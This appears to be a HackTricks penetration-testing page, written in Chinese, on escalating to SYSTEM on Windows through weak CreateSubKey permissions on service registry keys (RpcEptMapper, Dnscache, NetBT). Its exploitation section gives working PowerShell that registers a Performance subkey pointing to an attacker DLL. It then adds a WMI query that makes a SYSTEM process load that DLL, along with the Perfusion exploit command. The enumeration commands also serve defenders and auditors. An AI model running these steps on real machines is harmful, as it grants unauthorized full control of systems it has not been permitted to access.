# 服务注册表上的 AppendData/AddSubdirectory 权限

{{#include ../../banners/hacktricks-training.md}}

**原始文章：** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## 摘要

如果你只有服务注册表项上的 **`Create Subkey`** / **`AppendData/AddSubdirectory`** 权限，这仍然是一个很好的 privesc 线索。通常你**无法**直接覆盖现有的 `ImagePath`、`ServiceDll` 或其他值，但仍可能在以下位置创建一个 **`Performance`** 子项：

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- 任何其他你拥有 **`KEY_CREATE_SUB_KEY`** 权限的 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** 项

关键在于，Windows 仍支持旧版 **PerfLib V1** 注册模型。如果某个服务包含 **`Performance`** 子项，当 performance counter consumer 请求数据时，Windows 可能会从该位置加载 DLL。

根据 Microsoft 文档，最低注册要求如下：<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
因此，攻击侧的结论是：**不要因为只获得了 `CreateSubKey` 而不是 `SetValue`，就忽略 service registry finding**。<sup>[[3]](#references)</sup>

## 为什么这足以实现 code execution

在这些 services 上，`Performance` subkey 通常并不存在，因此你需要的 primitive 是 **`KEY_CREATE_SUB_KEY`**。一旦该 key 存在并包含 `Library`/`Open`/`Collect`/`Close`，任何 **performance counter consumer** 都可以触发 DLL load。<sup>[[3]](#references)</sup>

几个重要细节：

- **`Library`** value 可以指向一个**完整的 DLL 路径**。
- DLL 必须 export **`OpenPerfData`**、**`CollectPerfData`** 和 **`ClosePerfData`**，并返回 `ERROR_SUCCESS`。
- code 运行在 **consumer 的 context** 中，**不一定是在 vulnerable service process 本身中**。
- 在经典的 `RpcEptMapper` / `Dnscache` 场景中，**WMI performance query** 可以使 **`wmiprvse.exe`** 以 **`NT AUTHORITY\SYSTEM`** 身份 load 该 DLL。

这就是为什么在 triage 期间很容易漏掉这个 primitive：parent service key 并不是“完全可写”，但它仍然可以被 weaponize。

## 快速枚举

使用 **AccessChk** 进行手动 spot-check：
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
使用 PowerShell 查找对服务注册表项具有 **`CreateSubKey`** 权限的低权限主体：
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
实用工具：

- **PrivescCheck**：`Get-ModifiableRegistryPath` 专门用于发现此类问题。<sup>[[3]](#references)</sup>
- **SharpUp**：`SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**：在存在漏洞的旧版目标上自动执行 DLL drop、`Performance` 注册、WMI trigger、token duplication 和 cleanup（例如：`Perfusion.exe -c cmd -i -k Dnscache`）。<sup>[[4]](#references)</sup>

## 利用流程

创建 `Performance` 子项并填充所需值：<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
然后触发一个**特权**性能使用者。一个经典示例是通过 `Win32_Perf*` 类执行 WMI query：<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
操作说明：

- 启动 **`perfmon.exe`** 可用于验证计数器注册是否正确，但通常只会在**当前用户上下文**中加载 DLL。
- 对于实际的 LPE，应触发特权 consumer，例如 **WMI**。
- 如果你正在编写自己的 exploit，直接从 DLL 内部生成 `cmd.exe` 通常会让你获得位于 **session 0** 中的 shell。`Perfusion` 通过将特权 token 复制到攻击者 session 中以挂起状态创建的进程内解决了这一问题。<sup>[[4]](#references)</sup>
- DLL 架构必须与目标 consumer 匹配（**x64 系统使用 x64**）。

## 版本说明 / 最新进展

历史上，内置的弱权限键包括：<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**：`RpcEptMapper` 和 `Dnscache`
- **Windows 8 / Windows Server 2012**：`RpcEptMapper`

`Perfusion` 指出，**2021 年 4 月**的更新移除了已更新 **Windows 8 / Windows Server 2012** 上的简易 exploitation 路径，而 **Windows 7 / Windows Server 2008 R2** 仍可通过 **`Dnscache`** 被 exploit。<sup>[[4]](#references)</sup>

这一 primitive **并不只是历史遗留问题**。在 **2025 年 1 月**，Microsoft 修复了一个相关的 AD DS 问题：**`Network Configuration Operators`** 的成员可以在 **`Dnscache`** 和 **`NetBT`** 下创建子键，而相同的 **Performance-counter DLL 注册**思路仍可用于在受支持的系统上取得 **SYSTEM** 权限。<sup>[[2]](#references)</sup>

因此，现代经验是通用的：只要低权限 principal 对 **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** 拥有 **`CreateSubKey`** 权限，就应检查是否仅需创建一个 **`Performance`** 子键即可，而不要直接忽略该发现。

## 参考资料

- [1] [Microsoft Learn - 创建应用程序的 Performance 键](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services 权限提升漏洞（CVE-2025-21293）](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper 服务不安全注册表权限 EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion（RpcEptMapper 注册表键权限漏洞的 exploit）](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
